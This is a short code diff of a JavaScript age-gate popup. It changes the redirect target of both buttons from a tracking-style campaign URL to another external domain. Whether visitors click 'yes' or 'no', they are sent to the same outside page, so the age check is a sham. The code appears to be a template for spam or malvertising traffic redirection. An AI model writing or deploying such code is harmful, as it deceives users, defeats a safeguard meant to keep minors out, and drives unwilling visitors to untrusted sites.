@@ -87,12 +87,12 @@ if(form){
   function closeGate(){ bd.style.display='none'; bd.remove(); }
   bd.querySelector('#age-yes').addEventListener('click', 
                                                 function(){
-    window.location.href = "http://h2n6.com/?utm_campaign=9qv8yQwH8i&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+    window.location.href = "http://nexlure.site/"; // change to your target page
   });
                                                 
   bd.querySelector('#age-no').addEventListener('click', 
                                                function(){
-    window.location.href = "http://h2n6.com/?utm_campaign=9qv8yQwH8i&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+    window.location.href = "http://nexlure.site/"; // change to your target page
   });
 })();
 
